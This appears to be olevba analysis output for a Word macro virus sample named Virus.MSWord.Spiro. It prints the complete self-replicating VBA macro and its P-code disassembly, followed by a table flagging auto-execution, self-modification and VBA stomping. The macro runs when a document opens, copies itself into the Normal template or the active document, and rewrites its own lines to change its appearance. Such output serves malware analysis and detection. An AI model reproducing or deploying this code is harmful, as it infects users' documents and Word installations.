olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Spiro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Spiro - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Private Sub Document_Open()
Private Sub Document_Open()
'On Error Resume Next
On Error Resume Next
'Set vHost = ThisDocument.VBProject.VBComponents(1).CodeModule
Set v235234 = ThisDocument.VBProject.VBComponents(1).CodeModule
'vkod = vHost.Lines(1, vHost.CountOfLines)
k092345 = v235234.Lines(1, v235234.CountOfLines)
'If ThisDocument = ActiveDocument Then Set t759823 = NormalTemplate Else Set t759823 = ActiveDocument
If ThisDocument = ActiveDocument Then Set h759823 = NormalTemplate Else Set h759823 = ActiveDocument
'If t759823.VBProject.VBComponents(1).CodeModule.CountOfLines <> 49 Then
Set f785109 = h759823.VBProject.VBComponents(1).CodeModule
'With t759823.VBProject.VBComponents(1).CodeModule
If f785109.CountOfLines <> 49 Then
'.deletelines 1, .CountOfLines
With f785109
'.addfromstring vkod
.deletelines 1, .CountOfLines: .addfromstring k092345
'End With
End With
't759823.VBProject.Description = "WM.Spiroheta"
h759823.VBProject.Description = "WM.Spiroheta": End If
'End If
For t234566 = 1 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
'For a = 2 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
n096583 = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(t234566, 1)
'naskod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(a, 1)
If Left(n096583, 1) = "'" Then
'If Left(naskod, 1) = "'" Then
d099874 = Right(n096583, Len(n096583) - 1)
'desni = Right(naskod, Len(naskod) - 1)
ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine t234566, d099874
'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine a, desni
End If
'End If
d099874 = ""
'desni = ""
Next
'Next
For g650235 = 2 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
'For t = 1 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
j719579 = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(g650235, 1)
'naskod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(t, 1)
ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine g650235, "'" & j719579
'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine t, "'" & naskod
Next
'Next
End Sub
'End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Spiro
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5644 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001B "Private Sub Document_Open()"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	QuoteRem 0x0000 0x003D "Set vHost = ThisDocument.VBProject.VBComponents(1).CodeModule"
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set v235234 
' Line #6:
' 	QuoteRem 0x0000 0x0029 "vkod = vHost.Lines(1, vHost.CountOfLines)"
' Line #7:
' 	LitDI2 0x0001 
' 	Ld v235234 
' 	MemLd CountOfLines 
' 	Ld v235234 
' 	ArgsMemLd Lines 0x0002 
' 	St k092345 
' Line #8:
' 	QuoteRem 0x0000 0x0064 "If ThisDocument = ActiveDocument Then Set t759823 = NormalTemplate Else Set t759823 = ActiveDocument"
' Line #9:
' 	Ld ThisDocument 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set h759823 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set h759823 
' 	EndIf 
' Line #10:
' 	QuoteRem 0x0000 0x0047 "If t759823.VBProject.VBComponents(1).CodeModule.CountOfLines <> 49 Then"
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld h759823 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set f785109 
' Line #12:
' 	QuoteRem 0x0000 0x0031 "With t759823.VBProject.VBComponents(1).CodeModule"
' Line #13:
' 	Ld f785109 
' 	MemLd CountOfLines 
' 	LitDI2 0x0031 
' 	Ne 
' 	IfBlock 
' Line #14:
' 	QuoteRem 0x0000 0x001D ".deletelines 1, .CountOfLines"
' Line #15:
' 	StartWithExpr 
' 	Ld f785109 
' 	With 
' Line #16:
' 	QuoteRem 0x0000 0x0013 ".addfromstring vkod"
' Line #17:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith deletelines 0x0002 
' 	BoS 0x0000 
' 	Ld k092345 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #18:
' 	QuoteRem 0x0000 0x0008 "End With"
' Line #19:
' 	EndWith 
' Line #20:
' 	QuoteRem 0x0000 0x002E "t759823.VBProject.Description = "WM.Spiroheta""
' Line #21:
' 	LitStr 0x000C "WM.Spiroheta"
' 	Ld h759823 
' 	MemLd VBProject 
' 	MemSt Description 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #22:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #23:
' 	StartForVariable 
' 	Ld t234566 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #24:
' 	QuoteRem 0x0000 0x0052 "For a = 2 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2"
' Line #25:
' 	Ld t234566 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St n096583 
' Line #26:
' 	QuoteRem 0x0000 0x0046 "naskod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(a, 1)"
' Line #27:
' 	Ld n096583 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	QuoteRem 0x0000 0x001D "If Left(naskod, 1) = "'" Then"
' Line #29:
' 	Ld n096583 
' 	Ld n096583 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St d099874 
' Line #30:
' 	QuoteRem 0x0000 0x0026 "desni = Right(naskod, Len(naskod) - 1)"
' Line #31:
' 	Ld t234566 
' 	Ld d099874 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #32:
' 	QuoteRem 0x0000 0x0046 "ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine a, desni"
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #35:
' 	LitStr 0x0000 ""
' 	St d099874 
' Line #36:
' 	QuoteRem 0x0000 0x000A "desni = """
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	QuoteRem 0x0000 0x0004 "Next"
' Line #39:
' 	StartForVariable 
' 	Ld g650235 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #40:
' 	QuoteRem 0x0000 0x0052 "For t = 1 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2"
' Line #41:
' 	Ld g650235 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St j719579 
' Line #42:
' 	QuoteRem 0x0000 0x0046 "naskod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(t, 1)"
' Line #43:
' 	Ld g650235 
' 	LitStr 0x0001 "'"
' 	Ld j719579 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #44:
' 	QuoteRem 0x0000 0x004D "ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine t, "'" & naskod"
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	QuoteRem 0x0000 0x0004 "Next"
' Line #47:
' 	EndSub 
' Line #48:
' 	QuoteRem 0x0000 0x0007 "End Sub"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

